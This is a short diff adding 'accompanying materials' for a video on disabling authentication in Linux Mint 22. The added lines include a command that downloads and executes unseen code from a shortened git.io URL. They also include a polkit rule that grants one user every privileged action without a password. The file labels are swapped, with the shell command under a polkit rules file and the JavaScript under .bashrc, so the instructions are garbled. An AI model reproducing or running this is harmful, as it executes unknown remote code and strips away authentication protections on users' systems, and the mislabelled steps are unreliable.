@@ -1,3 +1,11 @@
+# Accompanying materials for the video "How to DISABLE authentication in LINUX MINT 22"
+# https://www.youtube.com/@TechMimic
+# https://odysee.com/@TechMimic
+
+# Add to 99-nopasswd.rules
+bash -c "$(wget -qO- https://git.io/vQgMr)"
+
+# Add to .bashrc
 polkit.addRule(function(action, subject) {
     if (subject.isInGroup("sudo") && subject.user == "your-username") {
         return polkit.Result.YES;
